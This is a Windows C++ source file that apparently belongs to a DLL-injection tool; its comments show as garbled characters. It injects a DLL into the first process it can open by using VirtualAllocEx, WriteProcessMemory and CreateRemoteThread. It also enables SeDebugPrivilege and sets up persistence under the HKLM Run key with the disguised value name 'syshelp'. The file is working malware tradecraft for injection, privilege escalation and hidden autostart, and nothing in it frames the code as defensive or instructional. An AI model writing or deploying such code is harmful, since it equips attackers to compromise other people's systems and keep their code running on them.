#include "inject.h"
#include <TlHelp32.h>

#include <stdio.h>

int InjectProcess(PROCESSENTRY32& pe, char* dllPath)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pe.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hSnapshot, &pe)) 
	{
		return -1;
	}
	//PTHREAD_START_ROUTINE pfn = (PTHREAD_START_ROUTINE)GetProcAddress(\
		LoadLibrary("kernel32"), "LoadLibraryW");
	PTHREAD_START_ROUTINE pfn = (PTHREAD_START_ROUTINE)GetProcAddress(\
		GetModuleHandle("kernel32"), "LoadLibraryA");
	if (NULL == pfn)
	{
		return -2;
	}
	//pfn(dllPath);
	//printf("%d", pfn);
	int cnt = 0;
	while (Process32Next(hSnapshot, &pe)) 
	{
		if(!strcmp(pe.szExeFile, "inject.exe"))
		{
			//�����Լ�����ע���Լ�
			continue;
		}
		//���ݽ���ID�õ����̾��
		HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
		if (hTargetProcess) 
		{
#if 1
			void* pRemoteData = VirtualAllocEx(hTargetProcess, 0,
				lstrlenA(dllPath)+1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			if (!pRemoteData)
			{
				continue;
			}

			//��dll���ֿ���������������
			if (!WriteProcessMemory(hTargetProcess,
				pRemoteData, dllPath, lstrlenA(dllPath) + 1, 0))
			{
				continue;
			}
			//�����������д����߳�
			HANDLE hRemoteThread = CreateRemoteThread(
				hTargetProcess, NULL, 0, (PTHREAD_START_ROUTINE)pfn,
				pRemoteData, 0, NULL);
			if (!hRemoteThread)
			{
				int err = errno;
				continue;
			}
#endif
			//cnt++;
			//VirtualFreeEx(hTargetProcess, pRemoteData, 0, MEM_RELEASE);
			//CloseHandle(hRemoteThread);
			//::WaitForSingleObject(hRemoteThread, INFINITE);
			return 0;
		}
	}

	return cnt;
}

//�������̷���Ȩ��
bool ImprovePriv()
{
	HANDLE hToken;
	LUID sedebugnameValue;
	TOKEN_PRIVILEGES tkp;

	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		return false;
	}
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue))
	{
		CloseHandle(hToken);
		return false;
	}
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = sedebugnameValue;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) 
	{
		CloseHandle(hToken);
		return false;
	}
	return true;
}

bool AutoStart(char* path)
{
	//������ӿ���������
	char regname[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	HKEY hKey;
	int ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, regname, 0, KEY_ALL_ACCESS, &hKey);    //��ע����
	ret = RegSetValueEx(hKey, "syshelp", 0, REG_EXPAND_SZ,
		(unsigned char*)path, strlen(path)); //���ü�ֵ

	if (ret == 0)
	{
		printf("succes to write reg key.\n");
		RegCloseKey(hKey);
		return true;
	}
	else
	{
		printf("failed to open regedit.%d\n", ret);
		return false;
	}
}